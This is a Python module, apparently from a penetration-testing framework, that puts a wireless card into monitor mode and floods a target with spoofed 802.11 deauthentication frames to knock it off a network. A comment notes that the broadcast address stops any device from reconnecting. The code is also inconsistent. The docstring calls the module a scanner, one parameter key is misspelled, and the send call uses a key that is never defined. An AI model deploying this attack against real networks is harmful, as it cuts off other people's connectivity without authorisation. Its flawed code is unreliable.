import os
import scapy.layers.dot11
from sys import platform
import utils.modulemanager as md
from scapy.all import *
from scapy.layers.dot11 import *
import pandas
import time
import os
from utils import checklibraries
from py_console import console, bgColor, textColor


class Main(md.Module):
    """Module for scanning for Requests in Network"""
    parameters = {"deivce": "wlan0", "device_name" : "wlan0mon","target_mac": "aa:aa:aa:aa:aa:aa","gateway_mac":"aa:aa:aa:aa:aa:aa", "count": "100"} #ff:ff:ff:ff:ff:ff destroys deive as it cannot reconnect again
    completions = list(parameters.keys())

    def do_exploit(self, line):
        console.log("Putting network Adapter into monitoring mode.")
        console.log("\n")
        os.system("airmon-ng check kill")
        os.system("sudo ifconfig wlan0 down")
        os.system("sudo iwconfig wlan0 mode monitor")
        os.system("sudo ifconfig wlan0 up")
        # os.system("airmon-ng start " + self.parameters['device'])
        # os.system("iwconfig")
        console.log("\n")
        try:

            dot11 = Dot11(addr1=str(self.parameters['target_mac']),addr2=str(self.parameters['gateway_mac']),addr3=str(self.parameters['gateway_mac']))
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            sendp(packet, inter=0.1, count=int(self.parameters['count']), iface=str(self.parameters['device_monitor']), verbose = 1)
        except KeyboardInterrupt:
            console.info("Stopping Sniffing WLAN")

    def complete_set(self, text, line, begidx, endidx):
        splitline = line.partition(' ')[2]
        offs = len(splitline) - len(text)
        return [s[offs:] for s in self.completions if s.startswith(splitline)]
